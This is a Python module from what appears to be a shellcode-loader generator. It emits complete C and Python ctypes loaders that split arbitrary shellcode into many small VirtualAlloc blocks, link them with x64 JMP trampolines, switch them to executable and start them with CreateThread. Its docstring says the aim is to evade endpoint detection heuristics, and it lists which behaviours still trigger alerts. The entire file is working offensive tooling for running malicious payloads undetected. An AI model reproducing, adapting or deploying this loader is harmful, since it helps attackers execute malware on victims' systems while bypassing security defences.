"""Loader: win_split_alloc — fragmented VirtualAlloc blocks linked by JMP trampolines.

Tier 3 (allocation pattern obfuscation).

Strategy:
  Divide the shellcode into CHUNK_SIZE-byte slices. Allocate each slice in a
  separate VirtualAlloc call (RW), then patch a 12-byte JMP trampoline at the
  end of each chunk pointing to the next chunk's base address. Flip all chunks
  to RX in a second pass, then execute from the first chunk's base.

JMP trampoline encoding (x64, 12 bytes):
  48 B8 [8-byte addr]   mov rax, imm64
  FF E0                 jmp rax

Evasion properties:
  - No single contiguous RWX or RX allocation covering the full shellcode
  - Each individual VirtualAlloc is CHUNK_SIZE + 12 bytes (small, unassuming)
  - Executable chunks are scattered across the address space; pattern-scan
    heuristics that look for large executable private regions are defeated
  - RW → RX two-stage keeps no chunk ever simultaneously writable + executable

Still triggers on:
  - Multiple small VirtualProtect(RX) calls on anonymous memory in rapid succession
  - CreateThread from a non-image-backed page

Parameters:
  chunk_size (int): bytes of shellcode per allocation [default: 64]
    Tune smaller for more fragmentation (more alloc calls, more scatter).
    Tune larger for fewer alloc calls but larger individual regions.
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_split_alloc")

_DEFAULT_CHUNK = 64

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

{sc_array}

#define CHUNK_SIZE   {chunk_size}
#define TRAMP_SIZE   12   /* mov rax, imm64 (10B) + jmp rax (2B) */

int main(void) {{
    int n = (sc_len + CHUNK_SIZE - 1) / CHUNK_SIZE;
    LPVOID *mem = (LPVOID *)calloc(n, sizeof(LPVOID));
    if (!mem) return 1;

    /* Allocate each chunk as RW and copy payload slice */
    for (int i = 0; i < n; i++) {{
        mem[i] = VirtualAlloc(NULL, CHUNK_SIZE + TRAMP_SIZE,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!mem[i]) {{
            fprintf(stderr, "[-] VirtualAlloc chunk %d failed: %lu\\n", i, GetLastError());
            return 1;
        }}
        int off = i * CHUNK_SIZE;
        int len = sc_len - off;
        if (len > CHUNK_SIZE) len = CHUNK_SIZE;
        memcpy(mem[i], sc + off, len);
    }}

    /* Patch inter-chunk JMP trampolines (all but the last chunk) */
    for (int i = 0; i < n - 1; i++) {{
        BYTE *t    = (BYTE *)mem[i] + CHUNK_SIZE;
        UINT64 nxt = (UINT64)(ULONG_PTR)mem[i + 1];
        t[0] = 0x48; t[1] = 0xB8;      /* mov rax, imm64 */
        memcpy(t + 2, &nxt, 8);
        t[10] = 0xFF; t[11] = 0xE0;    /* jmp rax */
    }}

    /* Flip all chunks to RX */
    for (int i = 0; i < n; i++) {{
        DWORD old;
        if (!VirtualProtect(mem[i], CHUNK_SIZE + TRAMP_SIZE,
                            PAGE_EXECUTE_READ, &old)) {{
            fprintf(stderr, "[-] VirtualProtect chunk %d failed: %lu\\n", i, GetLastError());
            return 1;
        }}
    }}

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem[0],
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    for (int i = 0; i < n; i++) VirtualFree(mem[i], 0, MEM_RELEASE);
    free(mem);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import struct
import sys

{sc_bytes}

CHUNK_SIZE = {chunk_size}
TRAMP_SIZE = 12   # mov rax, imm64 (10B) + jmp rax (2B)

kernel32 = ctypes.windll.kernel32

n = (len(sc) + CHUNK_SIZE - 1) // CHUNK_SIZE
chunks = []

# Allocate each chunk as RW and copy payload slice
for i in range(n):
    mem = kernel32.VirtualAlloc(None, CHUNK_SIZE + TRAMP_SIZE,
                                0x3000,   # MEM_COMMIT | MEM_RESERVE
                                0x04)     # PAGE_READWRITE
    if not mem:
        sys.exit(1)
    off = i * CHUNK_SIZE
    data = sc[off : off + CHUNK_SIZE]
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(data))
    chunks.append(mem)

# Patch inter-chunk JMP trampolines
for i in range(n - 1):
    tramp_addr = chunks[i] + CHUNK_SIZE
    nxt = chunks[i + 1]
    # 48 B8 [8-byte LE addr] FF E0
    stub = b'\\x48\\xb8' + struct.pack('<Q', nxt) + b'\\xff\\xe0'
    buf  = (ctypes.c_char * TRAMP_SIZE).from_buffer_copy(stub)
    kernel32.RtlMoveMemory(ctypes.c_void_p(tramp_addr), buf, TRAMP_SIZE)

# Flip all chunks to RX
old = ctypes.c_ulong(0)
for addr in chunks:
    if not kernel32.VirtualProtect(ctypes.c_void_p(addr), CHUNK_SIZE + TRAMP_SIZE,
                                   0x20,   # PAGE_EXECUTE_READ
                                   ctypes.byref(old)):
        sys.exit(1)

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(chunks[0]), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


def generate_c(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
    """Return a C loader that fragments shellcode into separate VirtualAlloc blocks."""
    return _C_TEMPLATE.format(
        sc_array=_render.c_array_literal(shellcode, "sc"),
        chunk_size=chunk_size,
    )


def generate_python(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
    """Return a Python ctypes loader using fragmented allocations + JMP trampolines."""
    return _PY_TEMPLATE.format(
        sc_bytes=_render.python_bytes_literal(shellcode, "sc"),
        chunk_size=chunk_size,
    )
